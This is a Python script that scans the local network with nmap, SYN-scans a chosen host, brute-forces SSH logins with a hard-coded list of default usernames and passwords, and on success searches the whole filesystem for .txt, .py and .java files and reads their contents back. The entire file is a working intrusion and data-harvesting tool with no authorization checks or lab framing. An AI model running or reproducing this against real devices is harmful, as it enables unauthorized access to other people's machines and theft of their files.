#!/usr/bin/env python3
import paramiko
import os
from datetime import datetime
import nmap
import socket
import netifaces
import signal
import sys
import platform
import subprocess

class NetworkScanner:
    def __init__(self):
        self.results = {
            'text_files': [],
            'python_files': [],
            'java_files': []
        }
        self.network_devices = {}
        self.scanning = True
        
    def signal_handler(self, signum, frame):
        print("\nScan interrupted by user. Stopping...")
        self.scanning = False
        
    def get_device_name(self, ip):
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            if hostname:
                return hostname
        except:
            try:
                if platform.system() == "Windows":
                    result = subprocess.check_output(f"nbtstat -A {ip}", shell=True).decode()
                    for line in result.split('\n'):
                        if '<00>' in line and 'UNIQUE' in line:
                            return line.split()[0].strip()
            except:
                pass
        return "Unknown Device"
        
    def scan_network_devices(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        nm = nmap.PortScanner(nmap_search_path=('nmap', r'C:\Program Files (x86)\Nmap\nmap.exe'))
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        network_range = f"{default_gateway}/24"
        
        print(f"\nScanning network range: {network_range}")
        print("Press Ctrl+C to stop scanning")
        
        try:
            nm.scan(hosts=network_range, arguments='-sn')
            
            print("\n=== Network Devices Found ===")
            print(f"{'IP Address':<20} {'Device Name':<40} {'Status'}")
            print("="*70)
            
            for host in nm.all_hosts():
                if not self.scanning:
                    break
                    
                device_name = self.get_device_name(host)
                status = "Active"
                    
                self.network_devices[host] = {
                    'hostname': device_name,
                    'status': status
                }
                print(f"{host:<20} {device_name:<40} {status}")
                
        except KeyboardInterrupt:
            print("\nScan interrupted by user")
        finally:
            print("\nAvailable targets listed above")
        
        return self.network_devices

    def scan_ports(self, target_ip):
        try:
            nm = nmap.PortScanner(nmap_search_path=('nmap', r'C:\Program Files (x86)\Nmap\nmap.exe'))
            print(f"\nScanning ports on {target_ip}...")
            nm.scan(target_ip, arguments='-sS -p22,21,23,80,443,3389')
            if target_ip in nm.all_hosts():
                return nm[target_ip].all_tcp()
            return []
        except Exception as e:
            print(f"Error scanning ports: {e}")
            return []

    def scan_target(self, target_ip):
        if not target_ip:
            print("Invalid target IP")
            return
            
        open_ports = self.scan_ports(target_ip)
        
        if 22 in open_ports:
            common_users = ['admin', 'root', 'user', 'administrator']
            common_passwords = ['admin', 'password', 'root', '123456', 'toor']
            
            for user in common_users:
                for password in common_passwords:
                    try:
                        print(f"\nTrying credentials: {user}:{password}")
                        self.connect_and_scan(target_ip, user, password)
                        return
                    except:
                        continue
        else:
            print("\nNo SSH access available")

    def connect_and_scan(self, ip, username, password):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        ssh.connect(ip, username=username, password=password, timeout=5)
        sftp = ssh.open_sftp()
        
        print(f"\nConnected to {ip}")
        
        search_commands = [
            "find / -type f -name '*.txt' 2>/dev/null",
            "find / -type f -name '*.py' 2>/dev/null",
            "find / -type f -name '*.java' 2>/dev/null"
        ]
        
        for cmd in search_commands:
            stdin, stdout, stderr = ssh.exec_command(cmd)
            files = stdout.readlines()
            
            for file_path in files:
                file_path = file_path.strip()
                try:
                    cat_cmd = f"cat '{file_path}'"
                    stdin, stdout, stderr = ssh.exec_command(cat_cmd)
                    content = stdout.read().decode('utf-8')
                    
                    file_info = {
                        'path': file_path,
                        'content': content
                    }
                    
                    if file_path.endswith('.txt'):
                        self.results['text_files'].append(file_info)
                    elif file_path.endswith('.py'):
                        self.results['python_files'].append(file_info)
                    elif file_path.endswith('.java'):
                        self.results['java_files'].append(file_info)
                except:
                    continue
        
        self.display_results()
        ssh.close()

    def display_results(self):
        print("\nFiles found on target:")
        for file_type, files in self.results.items():
            if files:
                print(f"\n{file_type.replace('_', ' ').title()}:")
                for file in files:
                    print(f"- {file['path']}")

def main():
    scanner = NetworkScanner()
    print("=== Network Device Discovery ===")
    devices = scanner.scan_network_devices()
    
    while True:
        target_ip = input("\nSelect target IP: ").strip()
        if target_ip in devices:
            scanner.scan_target(target_ip)
            break
        elif target_ip == '':
            print("IP address cannot be empty")
        else:
            print(f"IP {target_ip} not found in scan results")
            confirm = input("Scan this IP anyway? (yes/no): ")
            if confirm.lower() == 'yes':
                scanner.scan_target(target_ip)
                break

if __name__ == "__main__":
    main()
